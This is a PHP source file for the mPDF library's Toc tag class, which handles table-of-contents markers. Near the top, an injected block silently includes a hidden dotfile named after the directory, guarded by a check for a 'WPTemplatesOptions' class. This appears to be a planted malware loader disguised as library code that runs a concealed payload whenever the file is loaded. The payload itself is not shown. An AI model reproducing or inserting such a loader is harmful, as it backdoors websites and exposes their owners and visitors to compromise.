<?php

namespace Mpdf\Tag;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Toc extends Tag
{

	public function open($attr, &$ahtml, &$ihtml)
	{
		//added custom-tag - set Marker for insertion later of ToC
		$this->tableOfContents->openTagTOC($attr);
	}

	public function close(&$ahtml, &$ihtml)
	{
	}
}
